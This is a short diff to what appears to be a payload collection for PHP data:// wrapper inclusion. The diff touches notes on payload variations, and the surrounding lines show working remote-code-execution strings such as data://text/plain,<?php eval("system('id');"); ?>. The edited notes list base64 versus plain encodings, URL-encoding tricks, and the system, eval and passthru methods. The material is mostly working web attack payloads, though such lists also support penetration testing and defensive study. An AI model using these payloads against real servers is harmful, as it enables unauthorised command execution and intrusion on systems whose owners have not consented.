@@ -49,9 +49,9 @@ data%3Atext%2Fplain%2C%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
 data://text/plain,<?php%20eval(\"system('id');\");%20?>
 ```
 **variations derived from:**
-- using both base64 (`data://text/plain;base64`) and plain text input (`data:text/plain`)
-- url encoding different parts of the payload
-- utilizing various methods for achieving RCE
+- using both base64 (`data://text/plain;base64`) and plain text input (`data://text/plain`, `data:text/plain`)
+- url encoding different parts of the payload (encoding special chars)
+- utilizing various methods for achieving RCE: `system('id');`, `eval(\"system('id');\");`, `passthru(\"system('id');\");`
 
 
 ### Examples of working payload
